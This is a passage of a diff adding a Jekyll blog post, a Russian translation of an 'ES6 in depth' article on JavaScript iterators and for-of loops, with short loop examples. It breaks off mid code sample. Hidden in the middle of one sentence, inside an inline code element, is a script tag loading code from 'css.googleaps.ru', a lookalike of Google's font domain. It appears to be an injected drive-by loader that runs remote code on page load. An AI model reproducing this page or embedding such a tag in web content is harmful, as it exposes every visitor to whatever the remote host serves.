@@ -1,0 +1,98 @@
+---
+layout: post
+status: publish
+published: true
+title: 'ES6 в деталях: Итераторы и циклы for-of'
+author:
+  display_name: Maxyc Webber
+  login: admin
+  email: maxycws@gmail.com
+  url: ''
+author_login: admin
+author_email: maxycws@gmail.com
+wordpress_id: 1482
+wordpress_url: http://magazine.loc/%d0%b1%d0%b5%d0%b7-%d1%80%d1%83%d0%b1%d1%80%d0%b8%d0%ba%d0%b8/es6-%d0%b2-%d0%b4%d0%b5%d1%82%d0%b0%d0%bb%d1%8f%d1%85-%d0%b8%d1%82%d0%b5%d1%80%d0%b0%d1%82%d0%be%d1%80%d1%8b-%d0%b8-%d1%86%d0%b8%d0%ba%d0%bb%d1%8b-for-of/
+date: '2015-05-22 00:00:00 +0200'
+date_gmt: '2015-05-22 00:00:00 +0200'
+categories:
+- Без рубрики
+- Верстка
+tags:
+- ip
+- javascript
+- js
+comments: []
+---
+<p><em><a href="https:&#47;&#47;hacks.mozilla.org&#47;category&#47;es6-in-depth&#47;">ES6 в деталях<&#47;a> &mdash; это цикл статей о новых возможностях языка<br />
+программирования JavaScript, появившихся в 6 редакции стандарта ECMAScript,<br />
+кратко &mdash; ES6.<&#47;em><&#47;p></p>
+<p>Как перебрать все элементы массива?<br />
+Двадцать лет назад, когда JavaScript только появился, мы бы сделали так:<&#47;p></p>
+<pre><code>for (var index = 0; index < myArray.length; index++) {<br />
+    console.log(myArray[index]);<br />
+}<br />
+<&#47;code><&#47;pre></p>
+<p>Начиная с ES5, можно воспользоваться встроенным методом <a href="https:&#47;&#47;developer.mozilla.org&#47;en-US&#47;docs&#47;Web&#47;JavaScript&#47;Reference&#47;Global_Objects&#47;Array&#47;forEach"><code>forEach<&#47;code><&#47;a>:<&#47;p></p>
+<pre><code>myArray.forEach(function (value) {<br />
+    console.log(value);<br />
+});<br />
+<&#47;code><&#47;pre></p>
+<p>Так немного короче, но есть небольшой недостаток: нельзя прервать выполнение<br />
+цикла ключевым словом <a href="https:&#47;&#47;developer.mozilla.org&#47;en-US&#47;docs&#47;Web&#47;JavaScript&#47;Reference&#47;Statements&#47;break"><code>break<&#47;code><&#47;a> или выйти из внешней функции через<br />
+<a href="https:&#47;&#47;developer.mozilla.org&#47;en-US&#47;docs&#47;Web&#47;JavaScript&#47;Reference&#47;Statements&#47;return"><code>return<&#47;code><&#47;a>.<&#47;p></p>
+<p>Разумеется, было бы хорошо, если бы синтаксис цикла <code>for<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;code> просто позволял<br />
+перебрать все элементы массива.<&#47;p></p>
+<p>Как насчёт цикла <a href="https:&#47;&#47;developer.mozilla.org&#47;en-US&#47;docs&#47;Web&#47;JavaScript&#47;Reference&#47;Statements&#47;for...in"><code>for<&#47;code>-<code>in<&#47;code><&#47;a>?<&#47;p></p>
+<pre><code>for (var index in myArray) {    &#47;&#47; вообще-то, не стоит так делать<br />
+    console.log(myArray[index]);<br />
+}<br />
+<&#47;code><&#47;pre></p>
+<p>Это плохое решение, по нескольким причинам:<&#47;p></p>
+<ul>
+<li>
+<p>Значения, присваиваемые <code>index<&#47;code> в этом коде &mdash; строки <code>"0"<&#47;code>, <code>"1"<&#47;code>, <code>"2"<&#47;code><br />
+и т.д., а не настоящие числа. Вам, наверняка, не хотелось бы иметь дело<br />
+со строковой арифметикой (<code>"2" + 1 == "21"<&#47;code>), и поэтому это, по меньшей<br />
+мере, неудобно.<&#47;p><&#47;li></p>
+<li>
+<p>Тело цикла будет выполнено не только для элементов массива, но и для всех<br />
+<a href="https:&#47;&#47;developer.mozilla.org&#47;en-US&#47;docs&#47;Glossary&#47;Expando">expando<&#47;a>-свойств, кем-либо добавленных. К примеру, если в вашем массиве<br />
+есть перечисляемое свойство <code>myArray.name<&#47;code>, то этот цикл выполнится один<br />
+лишний раз, с <code>index == "name"<&#47;code>. Цикл может пройтись даже по свойствам из<br />
+цепочки прототипов массива.<&#47;p><&#47;li></p>
+<li>
+<p>Самое изумительное: при некоторых обстоятельствах этот код может обойти<br />
+элементы массива в произвольном порядке.<&#47;p><&#47;li><br />
+<&#47;ul></p>
+<p>Если кратко, <code>for<&#47;code>-<code>in<&#47;code> рассчитан на работу с обычными объектами <code>Object<&#47;code><br />
+с именами свойств в виде строк. Для массивов он подходит не так хорошо.<&#47;p></p>
+<h2>Могущественный цикл for-of<&#47;h2></p>
+<p>Помните, на прошлой неделе я обещал, что ES6 не сломает тот код на JS, что вы<br />
+уже написали?<br />
+Вот, миллионы сайтов зависят от поведения <code>for<&#47;code>-<code>in<&#47;code>, да, даже от того, как он<br />
+работает с массивами.<br />
+Так что о том, чтобы &laquo;поправить&raquo; <code>for<&#47;code>-<code>in<&#47;code> и сделать его более полезным для<br />
+массивов, не было и речи. Единственный способ, которым ES6 может улучшить<br />
+ситуацию &mdash; добавить какой-нибудь новый синтаксис.<&#47;p></p>
+<p>И вот так он выглядит:<&#47;p></p>
+<pre><code>for (var value of myArray) {<br />
+    console.log(value);<br />
+}<br />
+<&#47;code><&#47;pre></p>
+<p>Хмм&hellip; После моего интригующего описания вы, наверное, ожидали чего-то более<br />
+впечатляющего?<br />
+Что ж, давайте взглянем, есть ли у <a href="https:&#47;&#47;developer.mozilla.org&#47;en-US&#47;docs&#47;Web&#47;JavaScript&#47;Reference&#47;Statements&#47;for...of"><code>for<&#47;code>-<code>of<&#47;code><&#47;a> козырь в рукаве.<br />
+Для начала отметим, что:<&#47;p></p>
+<ul>
+<li>это самый лаконичный и наглядный синтаксис для перебора элементов массивов;<&#47;li>
+<li>у него нет недостатков <code>for<&#47;code>-<code>in<&#47;code>;<&#47;li>
+<li>в отличие от <code>forEach()<&#47;code>, он работает с <code>break<&#47;code>, <code>continue<&#47;code> и <code>return<&#47;code>.<&#47;li><br />
+<&#47;ul></p>
+<p>Циклы <code>for<&#47;code>-<strong><code>in<&#47;code><&#47;strong> нужны для перебора свойств объекта.<&#47;p></p>
+<p>Циклы <code>for<&#47;code>-<strong><code>of<&#47;code><&#47;strong> нужны для перебора <em>данных<&#47;em>, например, значений массива.<&#47;p></p>
+<p>Но это ещё не всё.<&#47;p></p>
+<h2>Использование for-of с другими коллекциями<&#47;h2></p>
+<p><code>for<&#47;code>-<code>of<&#47;code> не только для массивов. Он также работает с большинством<br />
+массивоподобных объектов, вроде списков<a href="https:&#47;&#47;developer.mozilla.org&#47;en-US&#47;docs&#47;Web&#47;API&#47;NodeList"><code>NodeList<&#47;code><&#47;a> в DOM.<&#47;p></p>
+<p>Ещё он работает со строками, рассматривая строку как набор символов Unicode:<&#47;p></p>
+<pre><code>for (var chr of "</p>
